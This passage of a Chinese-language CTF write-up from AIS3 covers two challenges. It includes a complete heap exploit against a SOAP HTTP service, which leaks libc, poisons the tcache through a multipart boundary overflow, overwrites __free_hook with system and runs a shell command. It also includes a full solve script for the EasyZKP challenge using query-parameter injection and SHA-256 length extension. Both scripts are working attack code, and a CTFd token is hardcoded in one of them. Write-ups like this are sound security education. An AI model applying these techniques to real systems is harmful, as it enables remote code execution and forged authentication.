  rbp + 0x1ff = '\r'
  rbp + 0x200 = '\n'
  rbp + 0x201 = '-'
  rbp + 0x202 = '-'
  rbp + 0x203 = B[0]
  rbp + 0x204 = B[1]
  ...
```

如果下一個 chunk header 在 `rbp + 0x210`，則：
```
next chunk size = B[5:13]
next chunk fd   = B[13:21]
```

所以 boundary 可以設成：
```python
B  = b'ABCDE'
B += p64(0x211)
B += p64(__free_hook - 0x18)
B += b'Z' * 40
```
這會把下一個 free chunk 的 `size` 修成 `0x211`，並把 tcache fd 改成 `__free_hook - 0x18`。
#### Heap grooming
先送一個 multipart request，建立並釋放多個 `0x200` body chunk，使 tcache 裡有足夠的 `0x210` chunks：
```python
send_multipart(
    boundary=b'GROOMBOUND',
    parts=[
        soap_get_scopes,
        b'A' * 8,
        b'A' * 8,
        b'A' * 8,
        b'A' * 8,
        b'A' * 8,
    ]
)
```

這會產生多個 `malloc(0x200)`，request 結束時被 free 到 tcache。
第二個 request 重新從 tcache 取 chunk：
```
part 0: SOAP UploadFirmware body
part 1: padding
part 2: vulnerable body, overflow into next free tcache chunk
part 3: consume poisoned chunk
part 4: allocated at __free_hook - 0x18
```

part 4 的內容：
```python
b'cat /f* >&4\x00'.ljust(0x18, b'X') + p64(system)
```
因為 allocation 回到 `__free_hook - 0x18`，所以 `offset +0x18` 正好寫到 `__free_hook`。

也就是：
`__free_hook = system`
之後 request cleanup 時會 free MIME body。當 free 到包含 command string 的 chunk 時：
`free("cat /f* >&4")`

實際上變成：
`system("cat /f* >&4")`
`fd 4` 是該 request 的 accepted socket，因此 flag 會直接接在 HTTP response 後面送回來。
#### Exploit
```python
#!/usr/bin/env python3
import socket
import re
import hashlib
import datetime
import time
import struct
TOKEN = "ctfd_b0c6009cd7761846d1fd848e7479930097765c0b2a0fd6e0dd1b9e7faec21a58"
HOST = "chals1.ais3.org"
LIBC_START_MAIN_RET = 0x24083
SYSTEM_OFF = 0x52290
FREE_HOOK_OFF = 0x1eee48
def p64(x):
    return struct.pack("<Q", x)
def u64(x):
    return struct.unpack("<Q", x.ljust(8, b"\x00"))[0]
def leading_zero_bits(digest):
    total = 0
    for byte in digest:
        if byte == 0:
            total += 8
            continue
        for shift in range(7, -1, -1):
            if byte & (1 << shift):
                return total
            total += 1
        return total
    return total
def start_instance():
    s = socket.create_connection((HOST, 21338), timeout=10)
    s.settimeout(10)
    def recvuntil(mark):
        data = b""
        while mark not in data:
            data += s.recv(4096)
        return data
    recvuntil(b"token>")
    s.sendall((TOKEN + "\n").encode())
    data = recvuntil(b"stamp>")
    resource = re.search(rb"resource: (\S+)", data).group(1).decode()
    bits = 24
    date = datetime.datetime.now(datetime.timezone.utc).strftime("%y%m%d%H%M%S")
    counter = 0
    while True:
        stamp = f"1:{bits}:{date}:{resource}::python:{counter:x}"
        digest = hashlib.sha1(stamp.encode()).digest()
        if leading_zero_bits(digest) >= bits:
            break
        counter += 1
    s.sendall((stamp + "\n").encode())
    recvuntil(b"choice>")
    s.sendall(b"1\n")
    out = b""
    deadline = time.time() + 5
    while time.time() < deadline:
        chunk = s.recv(4096)
        if not chunk:
            break
        out += chunk
        m = re.search(rb"Connect to: nc chals1\.ais3\.org (\d+)", out)
        if m:
            s.close()
            return int(m.group(1))
    raise RuntimeError(out)
def http(port, req, timeout=8):
    s = socket.create_connection((HOST, port), timeout=timeout)
    s.settimeout(timeout)
    s.sendall(req)
    out = b""
    while True:
        try:
            chunk = s.recv(8192)
        except Exception:
            break
        if not chunk:
            break
        out += chunk
    s.close()
    return out
def multipart_body(boundary, parts):
    body = b""
    for part in parts:
        body += b"--" + boundary + b"\r\n\r\n" + part + b"\r\n"
    body += b"--" + boundary + b"--\r\n"
    return body
def send_multipart(port, boundary, parts, timeout=8):
    body = multipart_body(boundary, parts)
    req = (
        b"POST / HTTP/1.1\r\n"
        b"Host: x\r\n"
        b"Content-Type: multipart/related; boundary=" + boundary + b"\r\n"
        b"Content-Length: " + str(len(body)).encode() + b"\r\n"
        b"\r\n" + body
    )
    return http(port, req, timeout)
def leak_libc(port):
    body = b"<s:Envelope><s:Body><tds:GetCapabilities/></s:Body></s:Envelope>"
    host = b"C" * 240
    req = (
        b"POST / HTTP/1.1\r\n"
        b"Host: " + host + b"\r\n"
        b"Content-Length: " + str(len(body)).encode() + b"\r\n"
        b"\r\n" + body
    )
    out = http(port, req)
    leak = u64(out[1544:1552])
    libc_base = leak - LIBC_START_MAIN_RET
    return libc_base, leak
def exploit():
    port = start_instance()
    print(f"[+] instance port: {port}")
    libc_base, leak = leak_libc(port)
    system = libc_base + SYSTEM_OFF
    free_hook = libc_base + FREE_HOOK_OFF
    target = free_hook - 0x18
    print(f"[+] libc leak: {hex(leak)}")
    print(f"[+] libc base: {hex(libc_base)}")
    print(f"[+] system: {hex(system)}")
    print(f"[+] __free_hook: {hex(free_hook)}")
    # Step 1: heap grooming
    soap_get_scopes = (
        b"<s:Envelope><s:Body><tds:GetScopes/></s:Body></s:Envelope>"
    )
    send_multipart(
        port,
        b"GROOMBOUND",
        [
            soap_get_scopes,
            b"A" * 8,
            b"A" * 8,
            b"A" * 8,
            b"A" * 8,
            b"A" * 8,
        ],
    )
    # Step 2: poisoned boundary
    boundary = b"ABCDE" + p64(0x211) + p64(target) + b"Z" * 40
    # Step 3: vulnerable false boundary
    upload_soap = (
        b"<s:Envelope><s:Body><tds:UploadFirmware/></s:Body></s:Envelope>"
    )
    vuln = (
        b"V" * 0x1ff
        + b"\r\n--"
        + boundary[:21]
        + bytes([boundary[21] ^ 1])
    )
    # This allocation lands at __free_hook - 0x18.
    hook_write = b"cat /f* >&4\x00".ljust(0x18, b"X") + p64(system)
    out = send_multipart(
        port,
        boundary,
        [
            upload_soap,
            b"P" * 8,
            vuln,
            b"C" * 8,
            hook_write,
        ],
        timeout=10,
    )
    print(out.decode(errors="replace"))
    m = re.search(rb"AIS3\{[^}]+\}", out)
    if m:
        print("[+] flag:", m.group(0).decode())
if __name__ == "__main__":
    exploit()
```
#### Exploit
 1. 連到 instancer。
 2. 輸入 CTFd token。
 3. 解 hashcash PoW。
 4. 啟動 instance，拿到實際 port。
 5. 送長 `Host` 的 `GetCapabilities request`，利用 stack overread leak libc。
 6. 用 glibc 2.31 offset 算出：
- `libc base`
- `system`
- `__free_hook`
 1. 送第一個 multipart request 做 heap grooming。
 2. 送第二個 multipart request：
- 使用 false-boundary heap overflow。
- 覆寫下一個 tcache chunk 的 `size` 與 `fd`。
- 讓後續 `malloc(0x200)` 回到 `__free_hook - 0x18`。
- 寫入 `cat /f* >&4` 與 `system` pointer。
 1. request cleanup 時觸發：
`free("cat /f* >&4")`
變成：
`system("cat /f* >&4")`
2. flag 被寫回 socket。
Flag
`AIS3{litTl3_R3@L_w0RlD_pWN_BU7_I_thINk_@i_Wri7e$_EXPlo1T_fa$TER}`

## crypto
### 抱歉聲明
#### 題目敘述
數學太爛了，沒辦法人腦解 QwQ，只看了一題，我以後會認真打 https://cryptohack.org/

### EasyZKP
#### 題目敘述
題目提供兩個服務：
- `verifier`: 對外提供 nc 介面，負責 oracle 與 challenge。
- `proof`: 內部 HTTP prover，根據 flag、suffix、seed 計算 proof。

目標不是單純當 prover 或 verifier，而是利用 verifier 提供的 oracle 偽造 challenge proof，通過 16 輪驗證後取得 flag。

核心 proof 定義在 `shared/zkp.py`：
```python
def hash_suffix(flag, suffix):
    return hashlib.sha256(flag + suffix).digest()


def compute_proof_from_digest(digest, seed):
    value = 0
    for byte in digest:
        for offset in range(7, -1, -1):
            if (byte >> offset) & 1 == 0:
                raw_value = value + seed
                value = raw_value % N
            else:
                value = pow(value, seed, N)
    return value
```

也就是：
```text
digest = SHA256(flag || suffix)

value = 0
for bit in digest:
    if bit == 0:
        value = value + seed mod N
    else:
        value = value^seed mod N
```

challenge 模式中，verifier 會讓我們提供 nonce，然後它產生 server suffix 與 seed：
```python
shown_nonce, server_part_b64 = build_nonce()
suffix = decode_suffix(shown_nonce) + decode_suffix(server_part_b64)
seed = secrets.randbelow(N - 2) + 2
expected = compute_proof(FLAG, suffix, seed)
```

我們必須輸入正確 proof，連續通過 16 輪。

#### 漏洞說明
verifier 的 oracle 會代替使用者向內部 prover 發 HTTP request：
```python
def fetch_proof(user_part_b64, server_part_b64, seed, bit_flip_indices=None):
    flip_query = ""
    if bit_flip_indices is not None:
        for index in bit_flip_indices:
            flip_query += f"&f={index}"
    url = f"{PROVER_URL}?p={server_part_b64}{flip_query}&d={user_part_b64}&s={seed}"
```

問題在於 `user_part_b64` 完全沒有 URL encode，直接被串進 query string。
因此我們可以在 nonce 輸入：
```text
&s=<chosen_seed>
```

最後送到 prover 的 URL 會類似：
```text
/prove?p=<server_part>&d=&s=<chosen_seed>&s=<hidden_seed>
```

而 prover 使用 `parse_qs` 解析 query：
```python
query = parse_qs(parsed.query, keep_blank_values=True)
seed = int(query["s"][0])
```

`parse_qs` 對重複參數會保留所有值，但程式取 `query["s"][0]`，也就是第一個 `s`。
所以我們可以藉由 query injection 覆蓋 verifier 原本隨機產生的 seed，讓 prover 使用我們指定的 seed。

oracle 另外還提供 bit flip 功能：
```python
elif choice == "2":
    index = int(read_line().strip())
    flipped_indices.append(index)
```

prover 會在計算 proof 前翻轉 digest 的指定 bit：
```python
digest = hash_suffix(flag, suffix)
for index in bit_flip_indices:
    digest = flip_digest_bit(digest, index)
```

限制是：
- 最多查 128 次 proof。
- 最多 flip 128 個 digest bit。

#### 數學原理
公開 modulus 為：
```text
N = 1371086445846712667727718527036585861739497962228620061686456237722902428356146756731186939
```

此數可以分解為：
```text
p = 1062991560384192946446466724143851978243633013
q = 1289837564986090927380812179078126226643568303
N = p * q
```

因此可以計算 Carmichael function：
```python
lambda_N = lcm(p - 1, q - 1)
```

對任意與 `N` 互質的 `x`，根據 Carmichael theorem：
```text
x^lambda_N ≡ 1 mod N
```

利用 seed injection，把 prover 的 seed 指定為 `lambda_N`。
此時 proof 運算變成：
```text
bit = 0: value = value + lambda_N mod N
bit = 1: value = value^lambda_N mod N
```

當 `value` 與 `N` 互質時，遇到 bit `1` 會變成：
```text
value^lambda_N ≡ 1 mod N
```

也就是 bit `1` 會把 state 重設成 `1`。

因此最後 proof 主要反映 digest 中「最右邊的 1 後面有幾個 0」。假設目前 digest 最右邊的 `1` 位在 bit index `i`，其後有：
```text
k = 255 - i
```

個 0，則最後結果會是：
```text
proof = 1 + k * lambda_N mod N
```

如果目前 digest 全部都是 0，則：
```text
proof = 256 * lambda_N mod N
```

還有一個邊界情況：如果剩下的 digest 是前綴一堆 1，後面都是 0，由於初始 state 是 0，而：
```text
0^lambda_N = 0
```

前面的 1 不會讓 state 變成 1，state 仍然保持 0，最後會得到：
```text
proof = k * lambda_N mod N
```

所以可以透過 proof 判斷目前 digest 最右邊的 1 在哪裡，然後用 flip oracle 把該 bit 翻掉。重複此流程，就能從右到左剝掉 digest 中的所有 1，進而還原整個：
```text
SHA256(flag || suffix0)
```

平均一個 SHA-256 digest 有 128 個 1。oracle 限制剛好是 128 次，因此如果某次 digest 的 1 太多，就重新連線拿新的 suffix 再試一次。

#### Exploit 流程
完整利用分成兩個階段
##### 階段一：Recover 一個 digest
進入 oracle 模式後，verifier 會印出 server suffix，然後要求我們輸入 nonce。

輸入：
```text
&s=<lambda_N>
```

使 prover 實際使用 `lambda_N` 當 seed。

接著重複以下步驟：
1. 查 proof。
2. 根據 proof 判斷最右邊的 1 bit 位置。
3. 呼叫 flip oracle 翻轉該 bit。
4. 繼續查下一個 proof。

在 exploit 中，判斷 proof 的邏輯如下：
```python
def proof_to_state(proof):
    no_ones = (256 * LAMBDA) % N
    if proof == no_ones:
        return "done", None

    for zeros_after in range(256):
        if proof == (zeros_after * LAMBDA) % N:
            return "prefix", 256 - zeros_after

    for zeros_after in range(256):
        if proof == (1 + zeros_after * LAMBDA) % N:
            return "bit", 255 - zeros_after
```

成功後得到：
```text
oracle_suffix = suffix0
oracle_digest = SHA256(flag || suffix0)
```

##### 階段二：SHA-256 Length Extension 偽造 challenge
challenge 每一輪會產生新的 server suffix `C`，並要求我們對：
```text
SHA256(flag || user_nonce || C)
```

的 digest 算 proof。

我們已知一組：
```text
D0 = SHA256(flag || suffix0)
```

SHA-256 是 Merkle-Damgard 結構，因此知道 digest 就等於知道壓縮函數的內部 state，可以做 length extension。

選擇：
```text
user_nonce = suffix0 || padding(len(flag) + len(suffix0))
```

則 verifier 實際計算的是：
```text
SHA256(flag || suffix0 || padding || C)
```

這正好可以從已知 state：
```text
D0 = SHA256(flag || suffix0)
```

繼續壓縮 `C` 得到 extended digest。
然後再使用 challenge 給的 seed 計算：
```python
answer = compute_proof_from_digest(extended_digest, seed)
```

回傳給 verifier 即可。

唯一不知道的是 `len(flag)`。這可以直接爆破合理範圍，例如 `6..100`。錯誤長度第一輪就會 `wrong`，正確長度會連續通過 16 輪。

#### Exploit
以下是完整 exploit，對應本地檔案 `solve.py`。
```python
#!/usr/bin/env python3
import base64
import math
import re
import socket
import struct
import time


HOST = "chals1.ais3.org"
PORT = 48765

N = 1371086445846712667727718527036585861739497962228620061686456237722902428356146756731186939
P = 1062991560384192946446466724143851978243633013
Q = 1289837564986090927380812179078126226643568303
LAMBDA = math.lcm(P - 1, Q - 1)

ROUND_COUNT = 16
GET_LIMIT = 128

K = [
    0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5,
    0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
    0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3,
    0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
    0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc,
    0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
    0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7,
    0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
    0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13,
    0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
    0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3,
    0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
    0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5,
    0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
    0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208,
    0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2,
]


def rotr(x, n):
    return ((x >> n) | (x << (32 - n))) & 0xffffffff


def sha256_compress(state, block):
    w = list(struct.unpack(">16I", block))
    for i in range(16, 64):
        s0 = rotr(w[i - 15], 7) ^ rotr(w[i - 15], 18) ^ (w[i - 15] >> 3)
        s1 = rotr(w[i - 2], 17) ^ rotr(w[i - 2], 19) ^ (w[i - 2] >> 10)
        w.append((w[i - 16] + s0 + w[i - 7] + s1) & 0xffffffff)

    a, b, c, d, e, f, g, h = state
    for i in range(64):
        s1 = rotr(e, 6) ^ rotr(e, 11) ^ rotr(e, 25)
        ch = (e & f) ^ (~e & g)
        temp1 = (h + s1 + ch + K[i] + w[i]) & 0xffffffff
        s0 = rotr(a, 2) ^ rotr(a, 13) ^ rotr(a, 22)
        maj = (a & b) ^ (a & c) ^ (b & c)
        temp2 = (s0 + maj) & 0xffffffff
        h, g, f, e, d, c, b, a = g, f, e, (d + temp1) & 0xffffffff, c, b, a, (temp1 + temp2) & 0xffffffff

    return [(x + y) & 0xffffffff for x, y in zip(state, [a, b, c, d, e, f, g, h])]


def sha256_padding(message_len):
    pad = b"\x80"
    pad += b"\x00" * ((56 - (message_len + 1) % 64) % 64)
    pad += struct.pack(">Q", message_len * 8)
    return pad


def sha256_extend(digest, prior_len, extra):
    state = list(struct.unpack(">8I", digest))
    total = prior_len + len(extra)
    data = extra + sha256_padding(total)
    for offset in range(0, len(data), 64):
        state = sha256_compress(state, data[offset:offset + 64])
    return struct.pack(">8I", *state)


def compute_proof_from_digest(digest, seed):
    value = 0
    for byte in digest:
        for offset in range(7, -1, -1):
            if (byte >> offset) & 1 == 0:
                value = (value + seed) % N
            else:
                value = pow(value, seed, N)
    return value


def b64(raw):
    return base64.urlsafe_b64encode(raw).decode()


class Conn:
    def __init__(self):
        self.sock = socket.create_connection((HOST, PORT), timeout=20)
        self.sock.settimeout(20)
        self.buf = b""

    def recv_until(self, marker):
        marker = marker.encode()
        while marker not in self.buf:
            chunk = self.sock.recv(4096)
            if not chunk:
                raise EOFError(self.buf.decode(errors="replace"))
            self.buf += chunk
        idx = self.buf.index(marker) + len(marker)
        out, self.buf = self.buf[:idx], self.buf[idx:]
        return out.decode(errors="replace")

    def sendline(self, line):
        if isinstance(line, str):
            line = line.encode()
        self.sock.sendall(line + b"\n")

    def close(self):
        self.sock.close()


def parse(pattern, text):
    m = re.search(pattern, text)
    if not m:
        raise ValueError(f"missing {pattern!r} in {text!r}")
    return m.group(1)


def proof_to_state(proof):
    no_ones = (256 * LAMBDA) % N
    if proof == no_ones:
        return "done", None
    for zeros_after in range(256):
        if proof == (zeros_after * LAMBDA) % N:
            return "prefix", 256 - zeros_after
    for zeros_after in range(256):
        if proof == (1 + zeros_after * LAMBDA) % N:
            return "bit", 255 - zeros_after
    raise ValueError(f"unexpected proof under lambda seed: {proof}")


def read_oracle_proof(c):
    c.recv_until(">\n")
    c.sendline("1")
    c.recv_until("proof = ")
    line = c.recv_until("\n")
    return int(line.strip())


def flip_oracle_bit(c, index):
    c.recv_until(">\n")
    c.sendline("2")
    c.recv_until("bit index:\n")
    c.sendline(str(index))
    c.recv_until("bit flipped\n")


def recover_digest(c):
    c.recv_until(">\n")
    c.sendline("1")
    out = c.recv_until("nonce:\n")
    server_b64 = parse(r"server suffix = (\S+)", out)
    server_suffix = base64.urlsafe_b64decode(server_b64.encode())

    c.sendline(f"&s={LAMBDA}")

    ones = []
    for _ in range(GET_LIMIT):
        proof = read_oracle_proof(c)
        kind, value = proof_to_state(proof)
        if kind == "done":
            digest_int = sum(1 << (255 - i) for i in ones)
            digest = digest_int.to_bytes(32, "big")
            c.recv_until(">\n")
            c.sendline("3")
            return server_suffix, digest
        if kind == "prefix":
            ones.extend(range(value))
            digest_int = sum(1 << (255 - i) for i in ones)
            digest = digest_int.to_bytes(32, "big")
            c.recv_until(">\n")
            c.sendline("3")
            return server_suffix, digest
        bit = value
        ones.append(bit)
        if len(ones) >= GET_LIMIT:
            break
        flip_oracle_bit(c, bit)

    c.close()
    raise RuntimeError(f"digest has too many one bits for this oracle session: {len(ones)}")


def answer_one_round(c, flag_len, oracle_suffix, oracle_digest, first_round_text=None):
    if first_round_text is None:
        first_round_text = c.recv_until("nonce:\n")
    server_b64 = parse(r"server suffix = (\S+)", first_round_text)
    challenge_server = base64.urlsafe_b64decode(server_b64.encode())

    glue = sha256_padding(flag_len + len(oracle_suffix))
    user_part = oracle_suffix + glue
    c.sendline(b64(user_part))

    text = c.recv_until("proof:\n")
    seed = int(parse(r"seed = (\d+)", text))
    prior_len = flag_len + len(oracle_suffix) + len(glue)
    digest = sha256_extend(oracle_digest, prior_len, challenge_server)
    c.sendline(str(compute_proof_from_digest(digest, seed)))
    return c.recv_until("\n")


def try_challenge(c, flag_len, oracle_suffix, oracle_digest):
    c.recv_until(">\n")
    c.sendline("2")
    text = c.recv_until("nonce:\n")
    line = answer_one_round(c, flag_len, oracle_suffix, oracle_digest, text)
    if "wrong" in line:
        return None
    if "ok" not in line:
        raise ValueError(f"unexpected first-round response: {line!r}")

    for _ in range(ROUND_COUNT - 1):
        line = answer_one_round(c, flag_len, oracle_suffix, oracle_digest)
        if "ok" not in line:
            raise ValueError(f"failed after accepted length {flag_len}: {line!r}")
    return c.recv_until("}\n")


def main():
    for attempt in range(1, 20):
        c = Conn()
        try:
            oracle_suffix, oracle_digest = recover_digest(c)
            print(f"[+] recovered digest on attempt {attempt}: {oracle_digest.hex()}", flush=True)
            for flag_len in range(6, 101):
                result = try_challenge(c, flag_len, oracle_suffix, oracle_digest)
                if result:
                    print(result.strip())
                    return
                print(f"[-] flag length {flag_len} rejected", flush=True)
            c.close()
        except RuntimeError as exc:
            print(f"[-] {exc}; retrying", flush=True)
        except Exception:
            c.close()
            raise
        time.sleep(0.5)
    raise SystemExit("failed to recover a usable digest")


if __name__ == "__main__":
    main()
```

##### 執行結果
實際執行：
```text
$ python3 solve.py
[-] digest has too many one bits for this oracle session: 128; retrying
[+] recovered digest on attempt 2: b3780291b87a1b0b3164787dd33a60d7758495cc94dbfe0509bb864d7d458745
[-] flag length 6 rejected
[-] flag length 7 rejected
...
[-] flag length 61 rejected
AIS3{simple_oracle_and_dramatic_injections_leading_forge_XDDD}
```
